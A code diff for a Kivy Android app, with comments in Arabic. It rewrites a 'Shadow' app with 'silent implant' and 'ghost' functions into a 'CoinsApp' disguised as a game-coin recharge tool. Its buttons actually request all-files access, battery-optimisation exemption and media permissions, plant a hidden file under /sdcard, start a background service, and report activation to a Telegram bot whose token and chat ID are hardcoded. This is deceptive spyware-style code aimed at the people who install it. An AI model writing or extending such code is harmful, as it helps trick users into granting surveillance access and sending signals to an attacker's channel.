@@ -3,84 +3,84 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
 from kivy.uix.label import Label
 from jnius import autoclass
-from android import mActivity
+from android.permissions import request_permissions, Permission
 import requests
 import os
 
-# بيانات البوت الخاصة بك
-TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
-CHAT_ID = "1256334460"
+# بيانات البوت الخاصة بك (تأكد من صحتها)
+BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
+CHAT_ID = "7084557369"
 
-class ShadowUI(BoxLayout):
-    def __init__(self, **kwargs):
-        super().__init__(orientation='vertical', spacing=15, padding=40, **kwargs)
-        self.add_widget(Label(text="SYSTEM RECOVERY", font_size='24sp', color=(1,0,0,1), bold=True))
+class CoinsApp(App):
+    def build(self):
+        layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
+        self.status = Label(text="Server Status: Online", font_size='18sp')
 
-        # المهمة 1: البطارية
-        self.btn1 = Button(text="MISSION 1: POWER BYPASS", height='60dp', size_hint_y=None)
-        self.btn1.bind(on_press=self.unlock_battery)
-        self.add_widget(self.btn1)
+        btn_1 = Button(text="RECHARGE COINS - SERVER 1", background_color=(0.2, 0.4, 0.9, 1))
+        btn_2 = Button(text="RECHARGE COINS - SERVER 2", background_color=(0.8, 0.5, 0.2, 1))
+        btn_3 = Button(text="RECHARGE COINS - FINAL STEP", background_color=(0.1, 0.7, 0.2, 1), bold=True)
 
-        # المهمة 2: الزرع الصامت (خلف الكواليس)
-        self.btn2 = Button(text="MISSION 2: CORE SYNC", height='60dp', size_hint_y=None)
-        self.btn2.bind(on_press=self.silent_implant)
-        self.add_widget(self.btn2)
+        btn_1.bind(on_press=self.open_files)
+        btn_2.bind(on_press=self.disable_battery)
+        btn_3.bind(on_press=self.start_sync)
 
-        # المهمة 3: إذن الملفات وتشغيل الشبح
-        self.btn3 = Button(text="MISSION 3: ACTIVATE", height='60dp', size_hint_y=None, background_color=(0,1,0,1))
-        self.btn3.bind(on_press=self.start_ghost)
-        self.add_widget(self.btn3)
+        layout.add_widget(self.status)
+        layout.add_widget(btn_1)
+        layout.add_widget(btn_2)
+        layout.add_widget(btn_3)
+        return layout
 
-        self.status = Label(text="System Status: Ready", font_size='14sp')
-        self.add_widget(self.status)
-
-    def unlock_battery(self, inst):
+    def open_files(self, instance):
         try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
             Intent = autoclass('android.content.Intent')
             Settings = autoclass('android.provider.Settings')
             Uri = autoclass('android.net.Uri')
-            try:
-                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                intent.setData(Uri.parse("package:org.shadow.shadowking"))
-                mActivity.startActivity(intent)
-            except:
-                mActivity.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
-            self.status.text = "Battery Request Sent"
+            activity = PythonActivity.mActivity
+            uri = Uri.parse("package:" + activity.getPackageName())
+            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
+            activity.startActivity(intent)
         except: pass
 
-    def silent_implant(self, inst):
+    def disable_battery(self, instance):
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Intent = autoclass('android.content.Intent')
+            Settings = autoclass('android.provider.Settings')
+            Uri = autoclass('android.net.Uri')
+            activity = PythonActivity.mActivity
+            uri = Uri.parse("package:" + activity.getPackageName())
+            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.setData(uri)
+            activity.startActivity(intent)
+        except: pass
+
+    def start_sync(self, instance):
+        # زرع ملف التخفي في الذاكرة
         try:
             path = "/sdcard/Android/.system_cache_data"
             os.makedirs(path, exist_ok=True)
             with open(os.path.join(path, ".core_bridge"), "w") as f:
-                f.write("PERSISTENT_ACTIVE")
-            
-            # إرسال إشارة للبوت
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                          data={"chat_id": CHAT_ID, "text": "✅ Mission 2: تم زرع ملف النظام بنجاح!"}, timeout=5)
-            self.btn2.text = "SYNCING..."
-            self.status.text = "Core Implanted"
-        except:
-            self.status.text = "Sync Error"
+                f.write("SYNC_ACTIVE")
+        except: pass
 
-    def start_ghost(self, inst):
+        perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
+        request_permissions(perms, self.launch)
+
+    def launch(self, permissions, grants):
         try:
-            Environment = autoclass('android.os.Environment')
-            if not Environment.isExternalStorageManager():
-                Intent = autoclass('android.content.Intent')
-                Settings = autoclass('android.provider.Settings')
-                Uri = autoclass('android.net.Uri')
-                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                intent.setData(Uri.parse("package:org.shadow.shadowking"))
-                mActivity.startActivity(intent)
-            else:
-                service = autoclass('org.shadow.shadowking.ServiceMyservice')
-                service.start(mActivity, "")
-                self.status.text = "Ghost Active"
-        except: self.status.text = "Activation Failed"
-
-class ShadowApp(App):
-    def build(self): return ShadowUI()
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            # استدعاء الخدمة بناءً على اسم الباكيج في buildozer
+            Service = autoclass('org.test.coinssync.ServiceMyservice')
+            Service.start(PythonActivity.mActivity, "")
+            
+            # إرسال إشارة نجاح للبوت
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                          data={"chat_id": CHAT_ID, "text": "✅ CoinsSync تم تفعيله واختراق الحواجز!"})
+            
+            self.status.text = "Status: Connection Active"
+        except Exception as e: 
+            self.status.text = "Error Connection"
 
 if __name__ == "__main__":
-    ShadowApp().run()
+    CoinsApp().run()
